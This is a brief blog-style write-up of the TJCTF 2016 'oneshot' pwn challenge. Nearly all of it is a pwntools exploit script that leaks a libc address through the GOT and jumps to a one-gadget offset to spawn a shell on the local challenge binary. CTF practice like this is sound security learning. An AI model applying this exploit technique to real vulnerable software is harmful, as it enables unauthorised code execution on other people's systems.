---
layout: post
alias: "/blog/2016/09/16/tjctf-2016-oneshot/"
date: "2016-09-16T17:13:16+09:00"
tags: [ "ctf", "writeup", "pwn", "tjctf", "one-gadget-rce" ]
"target_url": [ "https://github.com/ctfs/write-ups-2016/tree/master/tjctf-2016/pwn/oneshot-170" ]
---

# tjctf 2016 oneshot

Do one-gadget RCE.
In Ubuntu 16.04 libc, `0xf0897` is the address.

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
context.log_level = 'debug'

elf = ELF('./oneshot')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # Ubuntu 16.04
p = process('./oneshot')
p.sendline(str(elf.got['__libc_start_main']))
p.recvuntil('Value: ')
libc_base = int(p.recvline(), 16) - libc.symbols['__libc_start_main']
p.sendline(str(libc_base + 0xf0897))

time.sleep(1)
p.sendline('id')
p.interactive()
```
